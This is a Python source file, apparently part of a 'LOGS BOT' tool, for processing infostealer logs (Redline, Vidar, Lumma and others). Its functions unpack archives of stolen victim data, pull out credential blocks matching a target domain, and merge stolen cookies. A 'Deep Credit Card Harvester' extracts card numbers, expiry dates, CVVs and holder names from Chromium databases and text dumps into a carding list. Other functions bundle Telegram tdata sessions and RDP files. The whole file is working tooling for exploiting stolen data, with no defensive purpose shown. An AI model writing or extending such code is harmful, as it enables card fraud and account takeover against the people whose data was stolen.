# c:\Users\MARCOS\Desktop\LOGS BOT\extractor.py
import os
import shutil
import zipfile
import subprocess
import re
import sqlite3
from pathlib import Path
from typing import List, Set, Optional, Tuple, Dict

try:
    import py7zr
except ImportError:
    py7zr = None

try:
    import rarfile
except ImportError:
    rarfile = None

PASSWORD_FILENAMES = {
    "passwords.txt", "password.txt", "passwords", "credentials.txt",
    "logins.txt", "all passwords.txt", "account.txt", "accounts.txt"
}

# Ignore extensions that definitely never contain text/credentials
NON_CRED_EXTENSIONS = {
    ".png", ".jpg", ".jpeg", ".gif", ".ico", ".bmp", ".webp",
    ".mp3", ".mp4", ".avi", ".mkv", ".wav",
    ".exe", ".dll", ".sys", ".so", ".dylib",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
    ".pdf", ".docx", ".xlsx", ".pptx"
}

def find_system_unrar() -> Optional[str]:
    """Finds official unrar binary if available."""
    for binary in ["unrar", "/usr/local/bin/unrar", "/usr/bin/unrar", "C:\\Program Files\\WinRAR\\unrar.exe"]:
        found = shutil.which(binary)
        if found:
            return found
        if os.path.isfile(binary):
            return binary
    return None

def find_system_7z() -> Optional[str]:
    """Finds system 7z binary if available."""
    for binary in ["7z", "7za", "7zr", "/usr/bin/7z", "C:\\Program Files\\7-Zip\\7z.exe"]:
        found = shutil.which(binary)
        if found:
            return found
        if os.path.isfile(binary):
            return binary
    return None

def is_archive_encrypted_check(archive_path: Path) -> bool:
    """Proactively checks whether an archive requires a password."""
    seven_z = find_system_7z()
    if seven_z:
        try:
            res = subprocess.run([seven_z, "l", "-slt", "-p-", str(archive_path)],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
            combined = (res.stdout or "") + " " + (res.stderr or "")
            if "Encrypted = +" in combined or any(k in combined.lower() for k in ["wrong password", "encrypted", "headers error"]):
                return True
        except Exception:
            pass

    unrar_bin = find_system_unrar()
    if unrar_bin:
        try:
            res = subprocess.run([unrar_bin, "l", "-p-", str(archive_path)],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
            combined = (res.stdout or "") + " " + (res.stderr or "")
            if res.returncode == 11 or any(k in combined.lower() for k in ["wrong password", "password required", "bad password", "corrupt header", "crc failed"]):
                return True
        except Exception:
            pass

    return False

def unpack_archive(archive_path: Path, dest_dir: Path, password: Optional[str] = None) -> Tuple[bool, bool, Optional[str]]:
    """
    Unpacks ZIP, RAR, or 7Z archives completely into dest_dir.
    Uses official RARLAB unrar for RAR archives, and 7z CLI for 7Z/ZIP archives.
    Returns (success: bool, is_encrypted: bool, error_msg: Optional[str]).
    """
    dest_dir.mkdir(parents=True, exist_ok=True)
    suffix = archive_path.suffix.lower()
    unrar_bin = find_system_unrar()
    seven_z = find_system_7z()
    clean_pass = password.strip() if password else None
    last_error = ""

    # Strategy 1: Official RARLAB unrar for RAR archives
    if suffix == ".rar" and unrar_bin:
        cmd = [unrar_bin, "x", "-y"]
        if clean_pass:
            cmd.append(f"-p{clean_pass}")
        else:
            cmd.append("-p-")
        cmd.extend([str(archive_path), str(dest_dir) + os.sep])
        try:
            res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=900)
            combined_out = (res.stdout or "") + "\n" + (res.stderr or "")
            last_error = combined_out.strip()

            if any(dest_dir.iterdir()):
                return True, False, None

            if res.returncode in (3, 11) or any(k in combined_out.lower() for k in [
                "wrong password", "password required", "bad password", "corrupt header",
                "crc failed", "checksum error", "data error in encrypted", "encrypted"
            ]):
                return False, True, "Password required or wrong password"
        except Exception as e:
            last_error = str(e)
            print(f"[!] unrar CLI execution failed: {e}")

    # Strategy 2: System 7z CLI (for 7Z, ZIP, and fallback)
    if seven_z:
        cmd = [seven_z, "x", str(archive_path), f"-o{dest_dir}", "-y"]
        if clean_pass:
            cmd.append(f"-p{clean_pass}")
        else:
            cmd.append("-p-")
        try:
            res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=900)
            combined_out = (res.stdout or "") + "\n" + (res.stderr or "")
            if not last_error:
                last_error = combined_out.strip()

            if any(dest_dir.iterdir()):
                return True, False, None

            if any(k in combined_out.lower() for k in [
                "wrong password", "data error in encrypted file", "can not open encrypted",
                "encrypted", "headers error", "crc failed", "checksum error"
            ]):
                return False, True, "Password required or wrong password"
        except Exception as e:
            last_error = str(e)
            print(f"[!] 7z CLI execution failed: {e}")

    # Strategy 3: Python Libraries Fallback
    pwd_bytes = clean_pass.encode() if clean_pass else None
    try:
        if suffix == ".zip":
            with zipfile.ZipFile(archive_path, "r") as z:
                for member in z.infolist():
                    target_path = dest_dir / member.filename
                    if not target_path.resolve().is_relative_to(dest_dir.resolve()):
                        continue
                    z.extract(member, path=dest_dir, pwd=pwd_bytes)
            if any(dest_dir.iterdir()):
                return True, False, None

        elif suffix == ".rar" and rarfile:
            if unrar_bin:
                rarfile.UNRAR_TOOL = unrar_bin
            with rarfile.RarFile(archive_path, "r") as r:
                if clean_pass:
                    r.setpassword(clean_pass)
                r.extractall(path=dest_dir)
            if any(dest_dir.iterdir()):
                return True, False, None

        elif suffix == ".7z" and py7zr:
            with py7zr.SevenZipFile(archive_path, mode="r", password=clean_pass) as z:
                z.extractall(path=dest_dir)
            if any(dest_dir.iterdir()):
                return True, False, None

    except (zipfile.BadZipFile, RuntimeError) as err:
        err_str = str(err).lower()
        if "password" in err_str or "encrypted" in err_str:
            return False, True, "Password required"
    except Exception as err:
        err_str = str(err).lower()
        if "password" in err_str:
            return False, True, "Password required"

    # Final check: test if the archive has encryption flags
    is_encrypted = is_archive_encrypted_check(archive_path)
    if is_encrypted:
        return False, True, "Password required or wrong password"

    return False, False, (last_error[:120] if last_error else "Extraction failed")

def is_cookie_path(root_lower: str, file_lower: str) -> bool:
    """Checks if a file is a cookie file by parent directory or filename."""
    if "cookie" in root_lower or "cookie" in file_lower:
        return file_lower.endswith(".txt") or file_lower.endswith(".json") or file_lower.endswith(".sqlite") or file_lower.endswith(".log")
    return False

def is_card_path(root_lower: str, file_lower: str) -> bool:
    """Checks if a file is an autofill or card file by directory or filename."""
    keywords = ["card", "credit", "autofill", "cc", "wallet", "payment", "web data", "important", "info"]
    return any(k in root_lower or k in file_lower for k in keywords)

def scan_session_stats(session_path: Path) -> dict:
    """Analyzes unpacked logs to count total files, logs, cookies, passwords, and sessions."""
    stats = {
        "total_files": 0,
        "password_files": 0,
        "cookie_files": 0,
        "card_files": 0,
        "tdata_folders": 0,
        "rdp_files": 0,
        "size_mb": 0.0
    }
    total_bytes = 0

    for root, dirs, files in os.walk(session_path):
        root_l = root.lower()
        for d in dirs:
            if d.lower() == "tdata":
                stats["tdata_folders"] += 1

        for f in files:
            stats["total_files"] += 1
            fl = f.lower()
            fp = Path(root) / f
            try:
                total_bytes += fp.stat().st_size
            except OSError:
                pass

            if fl.endswith(".rdp"):
                stats["rdp_files"] += 1
            if any(p in fl for p in PASSWORD_FILENAMES) or ("password" in root_l and fl.endswith(".txt")):
                stats["password_files"] += 1
            if is_cookie_path(root_l, fl):
                stats["cookie_files"] += 1
            if is_card_path(root_l, fl):
                stats["card_files"] += 1

    stats["size_mb"] = round(total_bytes / (1024 * 1024), 2)
    return stats

def read_file_safe(file_path: Path) -> Optional[str]:
    """Reads file text safely: handles UTF-8, true UTF-16, Latin-1, and extracts printable text from SQLite/binary dumps."""
    try:
        with open(file_path, "rb") as bf:
            raw = bf.read(30 * 1024 * 1024) # Up to 30MB per file

        if not raw:
            return None

        # Check for SQLite files: extract ASCII strings directly
        if raw.startswith(b"SQLite format 3"):
            strings = re.findall(rb"[\x20-\x7E]{4,}", raw)
            return "\n".join(s.decode("latin-1", errors="ignore") for s in strings)

        # Check for true UTF-16 (BOM or regular alternating nulls in text)
        if raw.startswith(b"\xff\xfe") or raw.startswith(b"\xfe\xff"):
            try:
                return raw.decode("utf-16", errors="ignore")
            except Exception:
                pass
        elif len(raw) >= 4 and raw[1] == 0 and raw[3] == 0:
            try:
                return raw.decode("utf-16-le", errors="ignore")
            except Exception:
                pass

        # Try UTF-8
        try:
            return raw.decode("utf-8")
        except UnicodeDecodeError:
            pass

        # Fallback to Latin-1
        try:
            return raw.decode("latin-1")
        except Exception:
            pass

        # Last resort: extract printable ASCII sequences
        strings = re.findall(rb"[\x20-\x7E]{4,}", raw)
        return "\n".join(s.decode("latin-1", errors="ignore") for s in strings)
    except Exception:
        return None

def search_keywords_in_logs(session_path: Path, keyword: str, max_results: int = 50000) -> Tuple[List[str], int]:
    """
    Intelligent Stealer Log Parser:
    Extracts complete credential blocks (URL, Username, Password) or combo lines
    matching the specified keyword or domain.
    """
    keyword_lower = keyword.strip().lower()
    results = []
    seen = set()
    total_found = 0

    for root, _, files in os.walk(session_path):
        root_l = root.lower()
        for file in files:
            fl = file.lower()
            if fl.endswith(".txt") or any(pf in fl for pf in PASSWORD_FILENAMES) or "password" in root_l:
                file_path = Path(root) / file
                content = read_file_safe(file_path)
                if not content or keyword_lower not in content.lower():
                    continue

                lines = content.splitlines()
                i = 0
                while i < len(lines):
                    line = lines[i]
                    if keyword_lower in line.lower():
                        # Multi-line block format (Redline / Vidar / Lumma)
                        block = []
                        start_idx = max(0, i - 1)
                        end_idx = min(len(lines), i + 6)
                        
                        has_credentials = False
                        for j in range(start_idx, end_idx):
                            l = lines[j].strip()
                            if any(k in l.lower() for k in ["url:", "host:", "soft:", "username:", "user:", "login:", "password:", "pass:"]):
                                has_credentials = True
                                block.append(l)
                            elif block and l.startswith("="):
                                break

                        if has_credentials and len(block) >= 2:
                            entry_text = "\n".join(block)
                            if entry_text not in seen:
                                seen.add(entry_text)
                                total_found += 1
                                if len(results) < max_results:
                                    results.append(entry_text + "\n" + "-" * 40)
                            i = end_idx
                            continue
                        else:
                            # Standard combo line (URL:USER:PASS or USER:PASS)
                            clean_line = line.strip()
                            if clean_line and clean_line not in seen:
                                seen.add(clean_line)
                                total_found += 1
                                if len(results) < max_results:
                                    results.append(clean_line)

                    i += 1

    return results, total_found

def collect_cookies(session_path: Path, output_file: Path) -> Tuple[int, int]:
    """
    Collects all cookie files across the entire session:
    Detects cookies by directory name (Cookies/) as well as filenames.
    Merges all text cookies into output_file.
    Returns (number_of_cookie_files, total_cookie_lines).
    """
    output_file.parent.mkdir(parents=True, exist_ok=True)
    file_count = 0
    total_lines = 0

    with open(output_file, "w", encoding="utf-8", errors="ignore") as outfile:
        for root, _, files in os.walk(session_path):
            root_l = root.lower()
            for file in files:
                fl = file.lower()
                if is_cookie_path(root_l, fl):
                    file_path = Path(root) / file
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as inf:
                            lines = inf.readlines()
                            if lines:
                                file_count += 1
                                total_lines += len(lines)
                                outfile.write(f"\n# --- Cookie Source: {file_path.name} ({len(lines)} lines) ---\n")
                                outfile.writelines(lines)
                    except Exception:
                        pass

    return file_count, total_lines

def luhn_checksum(num_str: str) -> bool:
    """Standard Luhn Mod 10 validator."""
    try:
        digits = [int(d) for d in num_str]
        checksum = 0
        odd = False
        for d in reversed(digits):
            if odd:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
            odd = not odd
        return checksum % 10 == 0
    except Exception:
        return False

def clean_holder_name(raw_name: str) -> str:
    """Filters out binary hex strings, numbers, and non-name junk."""
    if not raw_name:
        return ""
    s = raw_name.strip()
    # Reject strings containing digits (names do not contain numbers)
    if re.search(r"\d", s):
        return ""
    # Reject strings with memory/hex dump patterns like "00 00 00", "AE A2 C0", "F7 7F"
    if re.search(r"\b[0-9A-Fa-f]{2}\s+[0-9A-Fa-f]{2}\s+[0-9A-Fa-f]{2}\b", s):
        return ""
    if any(k in s.lower() for k in ["card", "credit", "expire", "cvv", "master", "visa", "http", "null", "none", "true", "false", "value:"]):
        return ""
    return s[:40].strip()

def normalize_card_entry(raw_num: str, mm: str = "01", yy: str = "30", cvv: str = "", name: str = "") -> Optional[Tuple[str, str, str, str, str]]:
    """
    Maximal card parser: extracts cards from anywhere in logs regardless of expired month/year.
    Only filters out dummy zero-fill memory noise (00000000000000) or non-digit strings.
    """
    clean_num = re.sub(r"[\s-]", "", raw_num)
    if not (13 <= len(clean_num) <= 19) or not clean_num.isdigit():
        return None
    # Reject numbers starting with 0 or with all identical digits
    if clean_num[0] == "0" or len(set(clean_num)) <= 1:
        return None

    # Clean month and year
    clean_mm = re.sub(r"\D", "", mm.strip()) if mm else ""
    clean_yy = re.sub(r"\D", "", yy.strip()) if yy else ""

    # Detect if YY and MM are swapped (e.g. 2026/05 or 26/05)
    if clean_mm and clean_yy:
        val_m = int(clean_mm) if clean_mm.isdigit() else 0
        val_y = int(clean_yy) if clean_yy.isdigit() else 0
        if val_m > 12 and 1 <= val_y <= 12:
            clean_mm, clean_yy = clean_yy, clean_mm

    month_str = clean_mm.zfill(2)[-2:] if clean_mm else "01"
    year_str = clean_yy[-2:] if clean_yy else "30"

    clean_cvv = re.sub(r"\D", "", cvv.strip()) if cvv else ""
    if not (3 <= len(clean_cvv) <= 4):
        clean_cvv = ""

    clean_name = clean_holder_name(name)
    return (clean_num, month_str, year_str, clean_cvv, clean_name)

def _save_card_record(cards_map: Dict[str, Tuple[str, str, str, str]], num: str, mm: str, yy: str, cvv: str, name: str):
    """Saves a card record into cards_map, upgrading with richer attributes if available."""
    if num not in cards_map:
        cards_map[num] = (mm, yy, cvv, name)
    else:
        old_mm, old_yy, old_cvv, old_name = cards_map[num]
        new_mm = mm if (mm != "01" or old_mm == "01") else old_mm
        new_yy = yy if (yy != "30" or old_yy == "30") else old_yy
        new_cvv = cvv if cvv else old_cvv
        new_name = name if name else old_name
        cards_map[num] = (new_mm, new_yy, new_cvv, new_name)

def extract_cards_from_sqlite_db(db_path: Path, cards_map: Dict[str, Tuple[str, str, str, str]]):
    """Queries Chromium Web Data SQLite databases directly for credit cards and autofill."""
    try:
        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True, timeout=5)
        cursor = conn.cursor()
        
        # 1. credit_cards table
        try:
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for row in cursor.fetchall():
                holder = str(row[0] or "").strip()
                mm = str(row[1] or "01")
                yy = str(row[2] or "30")
                card_data = str(row[3] or "")
                num_m = re.search(r"\b(\d{13,19})\b", card_data)
                if num_m:
                    c = normalize_card_entry(num_m.group(1), mm, yy, "", holder)
                    if c:
                        _save_card_record(cards_map, c[0], c[1], c[2], c[3], c[4])
        except Exception:
            pass

        # 2. autofill table
        try:
            cursor.execute("SELECT name, value FROM autofill")
            for row in cursor.fetchall():
                name_col = str(row[0] or "").lower()
                val_col = str(row[1] or "").strip()
                if any(k in name_col for k in ["card", "cc", "number", "ccn"]) or (13 <= len(re.sub(r'\D', '', val_col)) <= 19):
                    num_m = re.search(r"\b([3-6]\d{12,18}|2[2-7]\d{14})\b", re.sub(r'[\s-]', '', val_col))
                    if num_m:
                        c = normalize_card_entry(num_m.group(1), "01", "30", "", "")
                        if c:
                            _save_card_record(cards_map, c[0], c[1], c[2], c[3], c[4])
        except Exception:
            pass

        conn.close()
    except Exception:
        pass

def parse_cards_from_content(content: str, cards_map: Dict[str, Tuple[str, str, str, str]]):
    """Parses credit cards from text content across all known stealer and dump formats."""
    lines = content.splitlines()

    # Pattern 1: Pure pipe format (NUMBER|MM|YY... or NUMBER|MM|YYYY|CVV|NAME)
    re_pipe = re.compile(
        r"(?:^|[^\d])([0-9]{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})(?:\s*\|\s*(\d{3,4}))?(?:\s*\|\s*([^|\r\n]*))?",
        re.MULTILINE
    )
    for m in re_pipe.finditer(content):
        c = normalize_card_entry(m.group(1), m.group(2), m.group(3), m.group(4) or "", m.group(5) or "")
        if c:
            _save_card_record(cards_map, c[0], c[1], c[2], c[3], c[4])

    # Pattern 1b: Date with slash/hyphen (NUMBER|MM/YY|CVV or NUMBER:MM/YY:CVV or NUMBER MM/YY CVV)
    re_slash_date = re.compile(
        r"(?:^|[^\d])([0-9]{13,19})\s*[|:;, ]\s*(\d{1,2})[ /.-](\d{2,4})(?:\s*[|:;, ]\s*(\d{3,4}))?(?:\s*[|:;, ]\s*([^|\r\n]*))?",
        re.MULTILINE
    )
    for m in re_slash_date.finditer(content):
        c = normalize_card_entry(m.group(1), m.group(2), m.group(3), m.group(4) or "", m.group(5) or "")
        if c:
            _save_card_record(cards_map, c[0], c[1], c[2], c[3], c[4])

    # Pattern 1c: Colon format (NUMBER:MM:YY:CVV or NUMBER:MM:YYYY:CVV)
    re_colon = re.compile(
        r"(?:^|[^\d])([0-9]{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})(?:\s*:\s*(\d{3,4}))?(?:\s*:\s*([^:\r\n]*))?",
        re.MULTILINE
    )
    for m in re_colon.finditer(content):
        c = normalize_card_entry(m.group(1), m.group(2), m.group(3), m.group(4) or "", m.group(5) or "")
        if c:
            _save_card_record(cards_map, c[0], c[1], c[2], c[3], c[4])

    # Pattern 2: Stealer key-value blocks (Redline, Vidar, Lumma, Stealc, Meta, etc.)
    re_card_header = re.compile(r"(?:card(?:[ _]?number)?|cc(?:[ _]?number)?|ccn|number|pan)\s*[:=]\s*([0-9 -]{13,22})", re.IGNORECASE)
    re_exp_full = re.compile(r"(?:exp(?:ir(?:y|ation))?[ _]?(?:date)?|expires|valid(?:ity)?)\s*[:=]\s*(\d{1,2})[ /.-](\d{2,4})", re.IGNORECASE)
    re_exp_m = re.compile(r"(?:exp(?:ir(?:y|ation))?[ _]?month|month)\s*[:=]\s*(\d{1,2})", re.IGNORECASE)
    re_exp_y = re.compile(r"(?:exp(?:ir(?:y|ation))?[ _]?year|year)\s*[:=]\s*(\d{2,4})", re.IGNORECASE)
    re_cvv = re.compile(r"(?:cvv2?|cvc2?|security[ _]?code|code|cvn)\s*[:=]\s*(\d{3,4})", re.IGNORECASE)
    re_holder = re.compile(r"(?:card[ _]?holder|holder|name[ _]?on[ _]?card|card[ _]?name|holder[ _]?name)\s*[:=]\s*([^\r\n]+)", re.IGNORECASE)

    # Pattern 3: Autofill block parsing & multi-line block detection
    for idx, line in enumerate(lines):
        line_clean = line.strip()
        raw_num = None

        num_m = re_card_header.search(line_clean)
        if num_m:
            raw_num = num_m.group(1)
        elif line_clean.lower().startswith("value:"):
            prev_line = lines[idx - 1].strip().lower() if idx > 0 else ""
            if any(k in prev_line for k in ["card", "cc", "number", "ccn"]):
                val_m = re.search(r"value\s*[:=]\s*([0-9 -]{13,22})", line_clean, re.IGNORECASE)
                if val_m:
                    raw_num = val_m.group(1)

        if raw_num:
            c_mm, c_yy, c_cvv, c_name = "01", "30", "", ""
            window = lines[max(0, idx - 6): min(len(lines), idx + 10)]
            
            for w_idx, w in enumerate(window):
                w_str = w.strip()
                ef = re_exp_full.search(w_str)
                if ef:
                    c_mm, c_yy = ef.group(1), ef.group(2)
                else:
                    em = re_exp_m.search(w_str)
                    if em:
                        c_mm = em.group(1)
                    ey = re_exp_y.search(w_str)
                    if ey:
                        c_yy = ey.group(1)
                
                cv = re_cvv.search(w_str)
                if cv:
                    c_cvv = cv.group(1)

                ho = re_holder.search(w_str)
                if ho:
                    c_name = ho.group(1)

                if "name:" in w_str.lower() and w_idx + 1 < len(window):
                    next_w = window[w_idx + 1].strip()
                    if next_w.lower().startswith("value:"):
                        val_content = next_w.split(":", 1)[1].strip()
                        if any(k in w_str.lower() for k in ["month", "exp_m"]):
                            c_mm = val_content
                        elif any(k in w_str.lower() for k in ["year", "exp_y"]):
                            c_yy = val_content
                        elif any(k in w_str.lower() for k in ["cvv", "cvc", "code"]):
                            c_cvv = val_content
                        elif any(k in w_str.lower() for k in ["holder", "cardholder", "name_on_card", "full_name"]) or (w_str.lower().startswith("name:") and "cc" not in w_str.lower() and "card" not in w_str.lower() and "number" not in w_str.lower()):
                            c_name = val_content

            c = normalize_card_entry(raw_num, c_mm, c_yy, c_cvv, c_name)
            if c:
                _save_card_record(cards_map, c[0], c[1], c[2], c[3], c[4])

    # Pattern 4: Standalone card search across any log line (valid Luhn cards)
    re_card_digits = re.compile(r"\b([3-6]\d{3}[ -]?\d{4}[ -]?\d{4}[ -]?\d{1,4}|2[2-7]\d{2}[ -]?\d{4}[ -]?\d{4}[ -]?\d{4}|4\d{12,18}|5[1-5]\d{14}|3[47]\d{13})\b")
    for idx, line in enumerate(lines):
        for cm in re_card_digits.finditer(line):
            candidate = cm.group(1)
            clean_digits = re.sub(r"\D", "", candidate)
            if 13 <= len(clean_digits) <= 19 and luhn_checksum(clean_digits):
                context = line + " " + (lines[idx + 1] if idx + 1 < len(lines) else "")
                m_exp = re.search(r"\b(0?[1-9]|1[0-2])[ /.-](\d{2,4})\b", context)
                m_cvv = re.search(r"\b(\d{3,4})\b", context.replace(candidate, ""))
                
                exp_m = m_exp.group(1) if m_exp else "01"
                exp_y = m_exp.group(2) if m_exp else "30"
                cvv_v = m_cvv.group(1) if m_cvv else ""
                c = normalize_card_entry(clean_digits, exp_m, exp_y, cvv_v, "")
                if c:
                    _save_card_record(cards_map, c[0], c[1], c[2], c[3], c[4])

def collect_cards(session_path: Path, output_file: Path) -> Tuple[int, int]:
    """
    Maximal Deep Credit Card Harvester:
    Scans every text, autofill, card, sqlite, and log file across the archive.
    Extracts all credit cards across all delimiter styles, blocks, and files.
    """
    output_file.parent.mkdir(parents=True, exist_ok=True)
    cards_map: Dict[str, Tuple[str, str, str, str]] = {}
    files_with_cards = 0

    for root, _, files in os.walk(session_path):
        root_l = root.lower()
        for file in files:
            fl = file.lower()
            ext = Path(fl).suffix

            if ext in NON_CRED_EXTENSIONS:
                continue

            file_path = Path(root) / file
            initial_count = len(cards_map)

            # SQLite check
            if fl == "web data" or ext in [".sqlite", ".db"]:
                extract_cards_from_sqlite_db(file_path, cards_map)

            content = read_file_safe(file_path)
            if content:
                parse_cards_from_content(content, cards_map)

            if len(cards_map) > initial_count:
                files_with_cards += 1

    # Write all cards to output file
    with open(output_file, "w", encoding="utf-8") as outfile:
        outfile.write(f"# Deep Harvested Credit Cards | Total Found: {len(cards_map)}\n")
        outfile.write("# Format: NUMBER|EXP_MONTH|EXP_YEAR|CVV|HOLDER\n")
        outfile.write("#" + "=" * 60 + "\n\n")
        for num, (mm, yy, cvv, name) in sorted(cards_map.items()):
            outfile.write(f"{num}|{mm}|{yy}|{cvv}|{name}\n")

    return len(cards_map), files_with_cards

def collect_all_passwords(session_path: Path, output_file: Path) -> int:
    """Collects all passwords/credentials files into one aggregated file."""
    output_file.parent.mkdir(parents=True, exist_ok=True)
    count = 0
    with open(output_file, "w", encoding="utf-8", errors="ignore") as outfile:
        for root, _, files in os.walk(session_path):
            root_l = root.lower()
            for file in files:
                fl = file.lower()
                if any(p in fl for p in PASSWORD_FILENAMES) or ("password" in root_l and fl.endswith(".txt")):
                    count += 1
                    file_path = Path(root) / file
                    outfile.write(f"\n# --- Log File: {file_path.name} ---\n")
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as inf:
                            shutil.copyfileobj(inf, outfile)
                    except Exception:
                        pass
    return count

def package_tdata(session_path: Path, output_zip: Path) -> int:
    """Packages all TData telegram session folders into a single zip archive."""
    output_zip.parent.mkdir(parents=True, exist_ok=True)
    tdata_count = 0
    with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, _ in os.walk(session_path):
            for d in dirs:
                if d.lower() == "tdata":
                    tdata_count += 1
                    tdata_folder = Path(root) / d
                    for f in tdata_folder.rglob("*"):
                        if f.is_file():
                            arc_path = Path(f"tdata_{tdata_count}") / f.relative_to(tdata_folder)
                            zf.write(f, arcname=str(arc_path))
    return tdata_count

def package_rdp(session_path: Path, output_zip: Path) -> int:
    """Packages all RDP connection files into a zip archive."""
    output_zip.parent.mkdir(parents=True, exist_ok=True)
    rdp_count = 0
    with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(session_path):
            for file in files:
                if file.lower().endswith(".rdp"):
                    rdp_count += 1
                    fp = Path(root) / file
                    zf.write(fp, arcname=f"rdp_{rdp_count}_{file}")
    return rdp_count
